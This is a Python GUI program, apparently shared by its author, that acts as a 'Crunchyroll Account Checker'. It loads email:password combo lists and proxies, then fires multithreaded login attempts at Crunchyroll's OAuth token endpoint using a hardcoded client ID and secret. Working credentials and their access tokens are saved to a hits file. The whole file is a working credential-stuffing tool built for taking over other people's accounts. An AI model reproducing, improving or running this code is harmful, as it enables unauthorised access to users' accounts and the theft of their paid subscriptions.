import os, re, sys, time, threading, queue, httpx, uuid, urllib.parse
import customtkinter as ctk
from colorama import Fore, Style, init
from datetime import datetime
init(autoreset=True)

class CrunchyrollChecker:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("💜 Crunchyroll GUI Checker 2025 💜 | Yashvir Gaming")
        self.root.geometry("1000x620")
        self.root.configure(fg_color="#0a0a0a")
        ctk.set_appearance_mode("dark")

        self.combo_list = []
        self.proxy_list = []
        self.running = False
        self.total = 0
        self.checked = 0
        self.hits = 0
        self.custom = 0
        self.expired = 0
        self.free = 0
        self.lock = threading.Lock()
        self.queue = queue.Queue()

        self.create_ui()
        self.root.mainloop()

    def create_ui(self):
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(1, weight=1)

        title = ctk.CTkLabel(self.root, text="🔥 Crunchyroll Account Checker 2025 🔥", font=("Arial Black", 22), text_color="#b266ff")
        title.pack(pady=10)

        top_frame = ctk.CTkFrame(self.root, fg_color="#121212")
        top_frame.pack(fill="x", padx=10, pady=5)

        ctk.CTkButton(top_frame, text="📂 Load Combos", command=self.load_combos, fg_color="#b266ff", hover_color="#9933ff").pack(side="left", padx=10, pady=10)
        ctk.CTkButton(top_frame, text="🌐 Load Proxies", command=self.load_proxies, fg_color="#b266ff", hover_color="#9933ff").pack(side="left", padx=10, pady=10)
        ctk.CTkButton(top_frame, text="▶ Start", command=self.start, fg_color="#4dffb8", text_color="black").pack(side="left", padx=10)
        ctk.CTkButton(top_frame, text="⏹ Stop", command=self.stop, fg_color="#ff4d4d").pack(side="left", padx=10)
        ctk.CTkButton(top_frame, text="💜 Credits", command=self.show_credits, fg_color="#9933ff").pack(side="right", padx=10)

        self.output = ctk.CTkTextbox(self.root, fg_color="#0a0a0a", text_color="#d9b3ff", font=("Consolas", 13), state="disabled")
        self.output.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        stats = ctk.CTkFrame(self.root, fg_color="#121212")
        stats.pack(fill="x", padx=10, pady=(0, 10))
        self.stats_label = ctk.CTkLabel(stats, text=self.format_stats(), text_color="#b266ff", font=("Consolas", 14))
        self.stats_label.pack(pady=6)

    def log(self, text):
        self.output.configure(state="normal")
        self.output.insert("end", text + Style.RESET_ALL + "\n")
        self.output.configure(state="disabled")
        self.output.see("end")

    def format_stats(self):
        return f"✅ Hits: {self.hits} | 🟣 Custom: {self.custom} | ⚫ Expired: {self.expired} | 🟢 Free: {self.free} | 🔄 Checked: {self.checked}/{self.total}"

    def update_stats(self):
        self.stats_label.configure(text=self.format_stats())

    def load_combos(self):
        path = ctk.filedialog.askopenfilename(title="Select Combo File", filetypes=[("Text Files", "*.txt")])
        if not path: return
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            self.combo_list = [x.strip() for x in f if x.strip()]
        self.total = len(self.combo_list)
        self.log(Fore.CYAN + f"[+] Loaded {self.total} combos")

    def normalize_proxy(self, proxy):
        if not proxy: return None
        proxy = proxy.strip().replace(" ", "")
        if "@" in proxy:
            return f"http://{proxy}" if not proxy.startswith("http") else proxy
        parts = proxy.split(":")
        if len(parts) == 2:
            return f"http://{proxy}"
        elif len(parts) == 4:
            ip, port, user, pwd = parts
            return f"http://{user}:{pwd}@{ip}:{port}"
        return None

    def load_proxies(self):
        path = ctk.filedialog.askopenfilename(title="Select Proxy File", filetypes=[("Text Files", "*.txt")])
        if not path: return
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            self.proxy_list = [self.normalize_proxy(x) for x in f if x.strip()]
        self.log(Fore.CYAN + f"[+] Loaded {len(self.proxy_list)} proxies")

    def get_proxy(self):
        if not self.proxy_list: return None
        return self.proxy_list[self.checked % len(self.proxy_list)]

    def start(self):
        if not self.combo_list:
            self.log(Fore.RED + "[!] Load combos first")
            return
        self.running = True
        threading.Thread(target=self.worker_manager, daemon=True).start()

    def stop(self):
        self.running = False
        self.log(Fore.YELLOW + "[!] Stopped manually")

    def worker_manager(self):
        threads = []
        for _ in range(20):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    def worker(self):
        while self.running and not self.queue.empty() or self.combo_list:
            try:
                combo = self.combo_list.pop(0)
            except IndexError:
                break
            email, password = combo.split(":", 1) if ":" in combo else (combo, "")
            self.log(Fore.CYAN + f"[Checking] {email}:{password}")
            self.check_account(email, password)
            with self.lock:
                self.checked += 1
                self.update_stats()

    def check_account(self, email, password):
        us = urllib.parse.quote(email)
        ps = urllib.parse.quote(password)
        yashvir = str(uuid.uuid4())
        gaming = str(uuid.uuid4())

        proxy = self.get_proxy()
        headers = {
            "Host": "beta-api.crunchyroll.com",
            "User-Agent": "Crunchyroll/3.83.1 Android/9 okhttp/4.12.0",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = f"grant_type=password&username={us}&password={ps}&scope=offline_access&client_id=ajcylfwdtjjtq7qpgks3&client_secret=oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_&device_type=SamsungTV&device_id={gaming}&device_name=Gaming"

        try:
            with httpx.Client(timeout=30.0, proxy=proxy) as client:
                r = client.post("https://beta-api.crunchyroll.com/auth/v1/token", headers=headers, data=data)
                if "access_token" in r.text:
                    token = re.search(r'"access_token":"(.*?)"', r.text)
                    token = token.group(1) if token else None
                    self.hit(email, password, token)
                elif "invalid_credentials" in r.text:
                    self.log(Fore.RED + f"[FAIL] {email}:{password}")
                else:
                    self.log(Fore.YELLOW + f"[CUSTOM] {email}:{password} | Unknown response")
        except Exception as e:
            self.log(Fore.MAGENTA + f"[ERROR] {email}:{password} | {e}")

    def hit(self, email, password, token):
        self.log(Fore.GREEN + f"[HIT] {email}:{password} | Token: {token} | Checker By 🔥 Telegram: @therealyashvirgaming 🔥")
        self.hits += 1
        self.update_stats()
        os.makedirs("Results", exist_ok=True)
        with open("Results/Hits.txt", "a", encoding="utf-8") as f:
            f.write(f"{email}:{password} | Token: {token} | Checker By 🔥 Telegram: @therealyashvirgaming 🔥\n")

    def show_credits(self):
        win = ctk.CTkToplevel(self.root)
        win.title("Credits")
        win.geometry("300x260")
        win.configure(fg_color="#0b0b0b")
        win.resizable(False, False)
        win.grab_set()
        ctk.CTkLabel(win, text="Made with ♥ by Yashvir Gaming", text_color="#b266ff", font=("Arial", 16, "bold")).pack(pady=15)
        ctk.CTkButton(win, text="YouTube", fg_color="#ff0000", command=lambda: os.system("start https://www.youtube.com/@YashvirBlogger?sub_confirmation=1")).pack(pady=5)
        ctk.CTkButton(win, text="Telegram", fg_color="#00ff7f", command=lambda: os.system("start https://t.me/OFFICIALYASHVIRGAMING_GROUPCHAT")).pack(pady=5)
        ctk.CTkButton(win, text="Facebook", fg_color="#1877f2", command=lambda: os.system("start https://www.facebook.com/groups/svbconfigsmaker/")).pack(pady=5)

if __name__ == "__main__":
    CrunchyrollChecker()
    input("Press Enter to close it...")
